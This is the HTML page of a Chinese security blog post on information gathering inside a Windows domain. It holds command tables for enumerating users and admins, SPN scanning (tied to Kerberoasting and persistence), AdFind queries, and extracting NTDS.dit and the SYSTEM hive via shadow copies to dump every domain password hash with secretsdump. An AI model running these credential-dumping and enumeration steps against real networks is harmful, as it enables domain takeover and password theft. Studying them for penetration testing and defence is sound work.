@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>域内信息收集</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="域内信息收集">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-09-24">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-09-24">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="信息收集">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//unpkg.com/valine/dist/Valine.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      域内信息收集
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-09-24T07:11:47.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-09-24</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          内网渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>1.4k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+            class="post-meta-link">
+            信息收集
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>net  use</td>
+<td>是否建立连接</td>
+</tr>
+<tr>
+<td>localhost</td>
+<td>查看主机名</td>
+</tr>
+<tr>
+<td>net  view</td>
+<td>查看域成员</td>
+</tr>
+<tr>
+<td>whoami  /all</td>
+<td>查看sid</td>
+</tr>
+<tr>
+<td>net  time /domain</td>
+<td>查看域控主机名、时间（任何域内主机都可执行）</td>
+</tr>
+<tr>
+<td>tasklist  /v</td>
+<td>详细进程信息</td>
+</tr>
+<tr>
+<td>ipconfig  /all  systeminfo</td>
+<td>查看ip、是否存在域等信息</td>
+</tr>
+<tr>
+<td>nslookup  dc.com</td>
+<td>查看域控ip</td>
+</tr>
+<tr>
+<td>net  group /domain</td>
+<td>获取所有域用户组列表</td>
+</tr>
+<tr>
+<td>net  group “domain admins” /domain</td>
+<td>获取域管理员列表</td>
+</tr>
+<tr>
+<td>net  group “domain computers” /domain</td>
+<td>机器列表</td>
+</tr>
+<tr>
+<td>net  group “enterprise admins” /domain</td>
+<td>获取企业管理员列表</td>
+</tr>
+<tr>
+<td>net  localgroup administrators /domain</td>
+<td>获取administrators组（本地组）</td>
+</tr>
+<tr>
+<td>net  group “domain controllers” /domain</td>
+<td>获得域控列表</td>
+</tr>
+<tr>
+<td>net  user /domain</td>
+<td>获取所有域用户列表</td>
+</tr>
+<tr>
+<td>net  user someuser /domain</td>
+<td>获得指定账户someuser的详细信息</td>
+</tr>
+<tr>
+<td>net  accounts /domain</td>
+<td>获得与密码策略设置、密码长短、错误锁定等信息</td>
+</tr>
+<tr>
+<td>nltest  /domain_trusts</td>
+<td>获取域信任信息</td>
+</tr>
+</tbody></table>
+<h1 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h1><p>服务实例，是一个服务的唯一标识，服务在加入域时自动注册。</p>
+<p>SPN扫描也可以叫扫描Kerberos服务实例名称，在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”。</p>
+<p>优点：</p>
+<p>1、SPN扫描不需要连接到网络上的每个IP来检查服务端口。</p>
+<p>2、SPN查询是正常Kerberos票据行为的一部分，所以这个操作很难被检测出来</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>注册在AD（域控活动目录）上，即Computers</td>
+<td>当一个服务的权限为Local  System或Network Service，则SPN注册在机器帐户(Computers)下</td>
+</tr>
+<tr>
+<td>注册在与用户账户下，即Users</td>
+<td>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</td>
+</tr>
+</tbody></table>
+<p><strong>利用</strong></p>
+<p>1、SPN扫描可以发现重要的服务机器，隐蔽性强（不需要主动扫描）</p>
+<p>2、所有的域用户都可以通过LDAP获取到域内所有SPN，进而通过Kerberoasting攻击完成域内提权等</p>
+<p>3、在获得SPN修改权限后可以为指定域用户添加SPN，通过随时获取该用户的TGS破解明文密码，作为域内持久化手段</p>
+<p>命令：</p>
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查询当前域下的所有SPN</td>
+<td><code>setspn –q */* </code> <br>该命令在Win 7 和  Win Server 2008以上版本系统自带</td>
+</tr>
+<tr>
+<td>查看指定域的所有SPN</td>
+<td><code>setspn –T 域名  –q */</code>  <br>以CN开头的，每一行都代表一个账户</td>
+</tr>
+</tbody></table>
+<p>域内常见的SPN实例</p>
+<table>
+<thead>
+<tr>
+<th>服务</th>
+<th>实例名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MSSQL服务</td>
+<td>MSSQLSvc/adsmsSQLAP01.adsecurity.org:1433</td>
+</tr>
+<tr>
+<td>RPC客户端访问服务器角色</td>
+<td>ExchangeMDB/adsmsEXCAS01.adsecurity.org</td>
+</tr>
+<tr>
+<td>RDP远程桌面协议服务</td>
+<td>TERMSERV/adsmsEXCAS01.adsecurity.org</td>
+</tr>
+<tr>
+<td>windows远程管理服务</td>
+<td>WSMAN/adsmsEXCAS01.adsecurity.org</td>
+</tr>
+<tr>
+<td>Hyper-V</td>
+<td>Microsoft  Virtual Console Service/adsmsHV01.adsecurity.org</td>
+</tr>
+<tr>
+<td>VMware</td>
+<td>STS/adsmsVC01.adsecurity.org</td>
+</tr>
+</tbody></table>
+<p>LDAP协议（389端口）</p>
+<p>轻量级目录访问协议。是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。LDAP采用Client/server模型，Server 用于存储数据，Client提供操作目录信息树的工具。</p>
+<p><strong>LDAP和AD域的区别：</strong></p>
+<p>1、 AD（Active Directory）是一种基于数据库的系统，可在windows环境中提供身份验证、目录、策略和其他服务；</p>
+<p>LDAP（轻量级目录访问协议）则提供查询和修改目录服务及程序中的项目应用协议</p>
+<p>2、 LDAP功能强大，支持各种角色、组、组织、部门、策略、权限控制等；</p>
+<p>AD则在功能上差很多，不能完成复杂的业务需求</p>
+<p>3、LDAP完全遵循业界的LDAP标准，能兼容任何支持LDAP协议的应用系统；</p>
+<p>AD在LDAP标准支持上的欠缺，导致它和其他应用系统的兼容性较差</p>
+<p><strong>域控常见端口：</strong></p>
+<p>53、88（Kerberos协议端口）、389</p>
+<h1 id="ADFind"><a href="#ADFind" class="headerlink" title="ADFind"></a>ADFind</h1><table>
+<thead>
+<tr>
+<th>说明</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>列出域控制器名称</td>
+<td>AdFind.exe -sc  dclist</td>
+</tr>
+<tr>
+<td>查询当前域中在线的计算机</td>
+<td>AdFind.exe -sc  computers_active</td>
+</tr>
+<tr>
+<td>查询当前域中在线的计算机(只显示名称和操作系统)</td>
+<td>AdFind.exe -sc  computers_active name operatingSystem</td>
+</tr>
+<tr>
+<td>查询当前域中所有计算机</td>
+<td>AdFind.exe -f  “objectcategory=computer”</td>
+</tr>
+<tr>
+<td>查询当前域中所有计算机(只显示名称和操作系统)</td>
+<td>AdFind.exe -f  “objectcategory=computer” name operatingSystem</td>
+</tr>
+<tr>
+<td>查询域内所有用户</td>
+<td>AdFind.exe -users  name</td>
+</tr>
+</tbody></table>
+<h1 id="抓取域内账号信息"><a href="#抓取域内账号信息" class="headerlink" title="抓取域内账号信息"></a>抓取域内账号信息</h1><p>ntds.dit</p>
+<p>Ntds.dit是主要的AD数据库，位于C:\windows\NTDS\NTDS.dit（锁定状态）。包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码 哈希值。使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p>
+<p>Volume Shadow Copy</p>
+<p> 是用于创建一致性的时间点副本（也就是快照）的服务框架。</p>
+<p>用于数据备份，支持Windows Server 2003 及以上操作系统。</p>
+<p>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>vssadmin</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>vssadmin  create shadow /for=C:</td>
+<td>获取卷影副本卷名</td>
+</tr>
+<tr>
+<td>copy 卷名\windows\NTDS\NTDS.dit  C:\</td>
+<td>导出ntds.dit文件</td>
+</tr>
+<tr>
+<td>copy 卷名\windows\system32\config\system  C:\</td>
+<td>导出system文件</td>
+</tr>
+<tr>
+<td>python  secretsdump.py -ntds ntds.dit -system system LOCAL</td>
+<td>导出两个文件到本地解密，获取域控所有账号信息</td>
+</tr>
+<tr>
+<td>vssadmin  delete shadows /for=c: /quiet</td>
+<td>删除快照</td>
+</tr>
+</tbody></table>
+<p><strong>ntdsutil导出</strong></p>
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查询当前系统的快照</td>
+<td>ntdsutil  snapshot “List All” quit quit   ntdsutil  snapshot “List Mounted” quit quit</td>
+</tr>
+<tr>
+<td>创建快照</td>
+<td>ntdsutil  snapshot “activate instance ntds” create quit quit</td>
+</tr>
+<tr>
+<td>挂载快照</td>
+<td>ntdsutil  snapshot “mount {78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa}” quit quit</td>
+</tr>
+<tr>
+<td>复制ntds.dit</td>
+<td>copy  C:$SNAP_201908291617_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</td>
+</tr>
+<tr>
+<td>复制system</td>
+<td>copy  C:$SNAP_201908291617_VOLUMEC$\windows\system32\config\system c:\system</td>
+</tr>
+<tr>
+<td>导出并解密</td>
+<td>secretsdump.py  -ntds ntds.dit -system system LOCAL</td>
+</tr>
+<tr>
+<td>卸载快照</td>
+<td>ntdsutil  snapshot “unmount {78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa}” quit quit</td>
+</tr>
+<tr>
+<td>删除快照</td>
+<td>ntdsutil  snapshot “delete {78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa}” quit quit</td>
+</tr>
+</tbody></table>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+            https://www.zerochen.top/article/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">攻击域控 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: '来将何人，可留姓名？',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SPN"><span class="toc-text">SPN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ADFind"><span class="toc-text">ADFind</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%9F%9F%E5%86%85%E8%B4%A6%E5%8F%B7%E4%BF%A1%E6%81%AF"><span class="toc-text">抓取域内账号信息</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">谨言多思，野蛮生长</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>57</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>11</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>55</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SPN"><span class="toc-text">SPN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ADFind"><span class="toc-text">ADFind</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%9F%9F%E5%86%85%E8%B4%A6%E5%8F%B7%E4%BF%A1%E6%81%AF"><span class="toc-text">抓取域内账号信息</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">7</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          内网渗透
+          <span class="categories-list-item-badge">11</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E5%AE%89%E6%9C%8D/">
+        <div class="categories-list-item">
+          安服
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/BurpSuite%E4%BB%A3%E7%90%86/" 
+        title="BurpSuite代理">
+        <div class="tags-list-item">BurpSuite代理</div>
+      </a>
+    
+      <a 
+        href="/tags/Access/" 
+        title="Access">
+        <div class="tags-list-item">Access</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/" 
+        title="绕过Token爆破">
+        <div class="tags-list-item">绕过Token爆破</div>
+      </a>
+    
+      <a 
+        href="/tags/CSRF/" 
+        title="CSRF">
+        <div class="tags-list-item">CSRF</div>
+      </a>
+    
+      <a 
+        href="/tags/HTML/" 
+        title="HTML">
+        <div class="tags-list-item">HTML</div>
+      </a>
+    
+      <a 
+        href="/tags/CSS/" 
+        title="CSS">
+        <div class="tags-list-item">CSS</div>
+      </a>
+    
+      <a 
+        href="/tags/HTTP/" 
+        title="HTTP">
+        <div class="tags-list-item">HTTP</div>
+      </a>
+    
+      <a 
+        href="/tags/JBoss/" 
+        title="JBoss">
+        <div class="tags-list-item">JBoss</div>
+      </a>
+    
+      <a 
+        href="/tags/JavaScript/" 
+        title="JavaScript">
+        <div class="tags-list-item">JavaScript</div>
+      </a>
+    
+      <a 
+        href="/tags/Java/" 
+        title="Java">
+        <div class="tags-list-item">Java</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/MS17-010/" 
+        title="MS17-010">
+        <div class="tags-list-item">MS17-010</div>
+      </a>
+    
+      <a 
+        href="/tags/MSSQL/" 
+        title="MSSQL">
+        <div class="tags-list-item">MSSQL</div>
+      </a>
+    
+      <a 
+        href="/tags/mysql/" 
+        title="mysql">
+        <div class="tags-list-item">mysql</div>
+      </a>
+    
+      <a 
+        href="/tags/Nosql/" 
+        title="Nosql">
+        <div class="tags-list-item">Nosql</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SPN"><span class="toc-text">SPN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ADFind"><span class="toc-text">ADFind</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%9F%9F%E5%86%85%E8%B4%A6%E5%8F%B7%E4%BF%A1%E6%81%AF"><span class="toc-text">抓取域内账号信息</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-24</div>
+        <a href="/article/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">域内信息收集</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-24</div>
+        <a href="/article/%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7/"><div class="recent-posts-item-content">攻击域控</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-23</div>
+        <a href="/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/"><div class="recent-posts-item-content">金票银票</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-09-23</div>
+        <a href="/article/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E4%B8%8Ehash%E4%BC%A0%E9%80%92%E5%B0%8F%E7%BB%93/"><div class="recent-posts-item-content">密码抓取与hash传递小结</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
